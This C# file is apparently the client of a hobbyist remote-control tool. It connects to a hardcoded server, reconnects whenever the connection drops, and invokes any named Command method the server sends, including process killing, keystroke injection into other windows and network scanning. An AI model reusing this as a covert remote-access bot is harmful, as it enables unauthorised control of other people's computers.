using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Reflection;
using System.IO;


namespace MAS_Client
{
    class Program
    {
        static NetworkStream stream;
        static Int32 port = 13000;
        static TcpClient client;
        //static String serverIP = "93.202.38.60";
        static String serverIP = "192.168.2.101";
        static Byte[] data;

        public void bla() { }

        static void Main(string[] args)
        {

            //Command.killProcess("calc");
            //Command.GetIPAdress();
            Command.NetworkScan("192.168.2.4");
            //Command.SetWallpaper(@"C:\Users\SStalker\Pictures\Route_66__XL_by_nuaHs.jpg");
            /*Console.WriteLine(Command.getOSPlatform());
            Command.setWallpaper(@"C:\Users\SStalker\Pictures\wallbase cc\wallpaper-1353834.jpg");

            for (int i = 0; i < 100; i++)
            {
                //Command.startProgram("notepad.exe", null);
            }
            Console.WriteLine(Command.getWallpaper());

            Console.WriteLine(Command.getActiveWindowTitle());

            Command.getOpenPrograms();

            Command.ShowNetworkInterfaces();
            //Console.WriteLine(Command.getHandleFromWindow("Rechner"));

            int specialHandle = Command.getHandleFromWindow("Editor");
            System.Threading.Thread.Sleep(5000);
            Command.setActiveWindow(specialHandle);
            Command.sendMessageToActiveWindow("Hallo ");
            System.Threading.Thread.Sleep(2000);
            Command.sendMessageToActiveWindow("Chris!!! :D");
            //Command.sendMessageToActiveWindow("{DELETE}");
            

            Command.getNetworkComputers();
            */


            Connect(serverIP);

            Console.WriteLine("Sucecessfully connected to the Server: {0}",serverIP);
            bool loop = true;

            if (client != null)
            {
                while (loop)
                {
                    try
                    {
                        // Buffer to store the response bytes.
                        data = new Byte[256];

                        // String to store the response Unicode representation.
                        String responseData = String.Empty;

                        // Read the first batch of the TcpServer response bytes.
                        Int32 bytes = stream.Read(data, 0, data.Length);

                        if (bytes != 0)
                        {
                            responseData = System.Text.Encoding.Unicode.GetString(data, 0, bytes);
                            //Console.WriteLine("Received: {0}", responseData);
                            ExecuteCommand(responseData);
                        }
                    }
                    catch (IOException e) 
                    {
                        // Check hresult from specific exceptions
                        //Console.WriteLine(e.ToString() + e.HResult);
                        Console.WriteLine("Lost connection. Try to reconnect.");
                        stream.Close();
                        client.Close();
                        Connect(serverIP);
                    }
                    //System.Threading.Thread.Sleep(200);
                        
                    
                        //Console.WriteLine("Lost connection. Try to reconnect.");
                        //Connect(serverIP);
                    
                }
            }
            else 
            {
                Console.WriteLine("Client is null. Try to RECONNECT.");
                Connect(serverIP);
            }
        }

        private static void ExecuteCommand(String commandInput)
        {
            String commandString = commandInput.Trim();
            int spacePosition = commandString.IndexOf(' ');
            String command;
            String[] commandArgs = null;

            if (spacePosition == -1)
            {
                command = commandString;
            }
            else
            {
                command = commandString.Substring(0, spacePosition);
                commandArgs = commandString.Substring(spacePosition + 1).Split(' ');
            }

            try
            {
                Console.WriteLine("Run cmd: " + commandString);
                typeof(Command).GetMethod(command).Invoke(null, commandArgs);
            }
            catch (TargetParameterCountException e)
            {
                Console.WriteLine(" -- Wrong parameter count");
                Console.WriteLine(e.ToString());
            }
            catch (NullReferenceException e)
            {
                // No such command.
                Console.WriteLine(" -- Command not found");
                Console.WriteLine(e.ToString());
            }
            catch (AmbiguousMatchException e)
            {
                // This happens if the Command class contains a command two times with different
                // parameters. To support this, we need to use "GetMethods()" instead of "GetMethod()"
                // to receive all available methods.
                Console.WriteLine(" -- Command not unique");
                Console.WriteLine(e.ToString());
            }
        }

        static void Connect(String server)
        {
            try
            {
                // Create a TcpClient.
                client = new TcpClient();
                client.Connect(server, port);
                
                // Get a client stream for reading and writing
                stream = client.GetStream();

                Command.setStream(ref stream);
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                if (e.ErrorCode == 10060)
                {
                    Console.WriteLine("ServerTimeout: Try a reconnect...");
                    Connect(serverIP);
                }
                else 
                {
                    Console.WriteLine("SocketException: {0}{1}", e, e.ErrorCode);
                }
            }
        }
    }
}


